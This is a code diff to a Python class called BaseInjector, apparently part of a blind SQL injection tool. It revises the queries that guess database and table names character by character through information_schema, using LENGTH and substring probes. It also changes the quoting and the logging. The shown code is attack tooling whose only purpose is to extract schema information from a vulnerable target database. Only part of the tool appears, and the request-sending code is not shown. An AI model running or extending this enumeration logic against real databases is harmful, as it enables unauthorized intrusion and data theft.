@@ -44,7 +44,7 @@ class BaseInjector(object):
         not_in_database_sql = ''.join(map(lambda x: " AND table_schema not like '" + x + "'\n", databases_found))
         sql = """SELECT 1
                     FROM information_schema.tables
-                   WHERE table_schema like "{0}"
+                   WHERE table_schema like '{0}'
                      AND LENGTH(table_schema) = {1}
                      {2}
               """.format(name, len(word), not_in_database_sql)
@@ -53,14 +53,14 @@ class BaseInjector(object):
     def testChars(self, word, database, chars, words_found):
         name = ''.join(word)
 
-        available_chars = ', '.join(map(lambda x: '"' + x + '"', chars))
+        available_chars = ', '.join(map(lambda x: "'" + x + "'", chars))
 
         if database is not None:
             not_already_found = ''.join(map(lambda x: " AND table_name not like '" + x + "'\n", words_found))
             sql = """SELECT 1
                         FROM information_schema.tables
-                       WHERE table_schema = "{database}"
-                         AND table_name like "{name}%"
+                       WHERE table_schema like '{database}'
+                         AND table_name like '{name}%'
                          AND substring(table_name, {offset}, 1) in ({chars})
                          {not_in_sql}
                      """.format(database=database, name=name, offset=len(word) + 1, chars=available_chars, not_in_sql=not_already_found)
@@ -68,7 +68,7 @@ class BaseInjector(object):
             not_schema_sql = ''.join(map(lambda x: " AND table_schema not like '" + x + "'\n", words_found))
             sql = """SELECT 1
                         FROM information_schema.tables
-                       WHERE table_schema like "{0}%"
+                       WHERE table_schema like '{0}%'
                          AND substring(table_schema, {1}, 1) IN ({2})
                          {3}
                   """.format(name, len(word) + 1, available_chars, not_schema_sql)
@@ -107,8 +107,8 @@ class BaseInjector(object):
         table_not_already_find = ''.join(map(lambda x: " AND table_name not like '" + x + "'\n", tables_found))
         sql = """SELECT 1
                     FROM information_schema.tables
-                   WHERE table_schema = "{0}"
-                     AND table_name   = "{1}"
+                   WHERE table_schema like '{0}'
+                     AND table_name   like '{1}'
                      AND LENGTH(table_name) = {2}
                      {3}
               """.format(database, table_name, len(table_name), table_not_already_find)
@@ -118,11 +118,12 @@ class BaseInjector(object):
         word = []
         while not self.isTableCompleted(word, database, tables_found):
             char = self.findNextChar(word, tables_found, database)
-            self.logger.debug("Next char found: {0}.{1}".format(database, ''.join(word)))
             if char is False:
                 return False
             else:
                 word.append(char)
+
+            self.logger.debug("Next char found: {0}.{1}".format(database, ''.join(word)))
 
         return ''.join(word)
 
@@ -131,12 +132,13 @@ class BaseInjector(object):
         new_table = self.findNewTable(database, tables)
         while (new_table):
             tables.append(new_table)
-            self.logger.debug("New table found: {0}.{1}".format(database, new_table))
+            self.logger.info("New table found: {0}.{1}".format(database, new_table))
             new_table = self.findNewTable(database, tables)
         return tables
 
     def getDatabases(self):
-        databases = []
+        # information_schema should always exists, otherwise none of this would work.
+        databases = ['information_schema']
         new_database = self.findNewDatabase(databases)
         while (new_database):
             databases.append(new_database)
@@ -144,6 +146,7 @@ class BaseInjector(object):
             new_database = self.findNewDatabase(databases)
         self.logger.info("{0} Databases founds: {1}".format(len(databases), databases))
 
+        databases.remove('information_schema')
         return databases
 
     def getTables(self, databases):
